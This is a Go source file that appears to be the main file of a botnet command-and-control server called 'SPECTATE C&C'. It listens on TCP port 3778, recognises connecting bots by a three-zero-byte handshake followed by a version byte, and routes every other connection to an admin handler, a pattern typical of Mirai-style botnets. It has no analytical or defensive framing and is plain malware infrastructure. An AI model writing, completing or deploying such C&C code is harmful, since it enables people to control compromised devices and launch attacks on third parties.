package main

import (
	"fmt"
	"net"
	"time"
)

type LoginSession struct {
	IP        string
	Timestamp time.Time
}

var lastLogins = make(map[string]LoginSession)
var clientList *ClientList = NewClientList()

func main() {
	fmt.Println("\x1b[38;2;255;0;0mStarting SPECTATE C&C.. >\x1b[0m")
	time.Sleep(500 * time.Millisecond)
	fmt.Println("\x1b[38;2;255;0;0mBooting System.. >\x1b[0m")
	time.Sleep(500 * time.Millisecond)
	fmt.Println("\x1b[38;2;255;255;255mSPECTATE is now ONLINE!\x1b[0m")
	fmt.Println("\x1b[38;2;255;255;255mListening on 0.0.0.0:3778\x1b[0m")

	tel, err := net.Listen("tcp", "0.0.0.0:3778")
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}

		go initialHandler(conn)
	}
}

func initialHandler(conn net.Conn) {
	conn.SetDeadline(time.Now().Add(200 * time.Millisecond))

	buf := make([]byte, 32)
	l, err := conn.Read(buf)

	if err != nil || l <= 0 {
		NewAdmin(conn).Handle()
		return
	}

	if l >= 4 && buf[0] == 0x00 && buf[1] == 0x00 && buf[2] == 0x00 {
		NewBot(conn, buf[3], "").Handle()
	} else {
		NewAdmin(conn).Handle()
	}
}

func netshift(prefix uint32, netmask uint8) uint32 {
	return uint32(prefix >> (32 - netmask))
}
